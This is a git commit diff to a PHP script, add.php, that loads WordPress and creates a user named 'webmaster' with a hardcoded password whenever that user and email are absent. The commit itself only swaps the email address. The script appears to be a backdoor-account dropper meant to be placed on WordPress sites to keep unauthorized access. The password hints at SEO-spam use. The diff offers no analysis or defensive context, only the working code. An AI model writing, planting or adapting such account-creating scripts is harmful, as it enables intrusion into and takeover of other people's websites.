bd5ed71db67a4bab46d6403b3f9e659852745024
handoko1013 <94730449+handoko1013@users.noreply.github.com>
2025-12-09 09:33:19 +0700

    Update add.php

--- add.php
+++ add.php
@@ -4,7 +4,7 @@ require_once('./wp-load.php');
 
 $username = 'webmaster';
 $password = 'Seo301Take!';
-$email = 'langgar@gamail.com';
+$email = 'thesdans@gamail.com';
 
 if (!username_exists($username) && !email_exists($email)) {
     $user_id = wp_create_user($username, $password, $email);
@@ -25,3 +25,4 @@ if (!username_exists($username) && !email_exists($email)) {
 }
 
 ?>
+
